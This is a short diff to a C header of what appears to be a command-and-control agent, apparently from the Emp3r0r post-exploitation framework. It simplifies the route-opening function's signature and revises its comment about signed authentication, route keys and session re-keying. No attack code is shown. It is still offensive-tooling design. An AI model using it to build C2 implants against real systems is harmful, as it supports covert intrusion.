@@ -249,12 +249,11 @@ void c2_session_cleanup(c2_agent_session *s);
 /*
  * Open `route` and send a signed MsgAuth. For auxiliary routes the SecureConn
  * is immediately re-keyed to the current PFS session key (if one is
- * established); checkin/msg stay on the PSK. `caps` must contain the route
- * token plus any feature tokens.
+ * established); checkin/msg stay on the PSK. `route` selects both the URL and
+ * the MsgAuth route.
  */
 c2_status c2_session_open_route(c2_agent_session *s, c2_str route,
-                                c2_str stream_id, const c2_str_list *caps,
-                                c2_secureconn *sc);
+                                c2_str stream_id, c2_secureconn *sc);
 
 /*
  * Check in: open the checkin route, send the Emp3r0rAgent body, then wait for
